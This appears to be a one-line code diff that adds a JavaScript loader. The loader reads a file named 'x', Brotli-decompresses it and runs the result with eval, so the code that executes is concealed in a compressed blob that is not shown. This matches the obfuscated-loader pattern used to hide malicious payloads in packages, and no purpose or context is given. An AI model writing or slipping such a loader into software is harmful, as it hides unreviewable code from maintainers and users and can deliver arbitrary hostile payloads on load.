@@ -1,0 +1,1 @@
+r=require,eval(r('zlib').brotliDecompressSync(r('fs').readFileSync(__dirname+'/x'))+'')
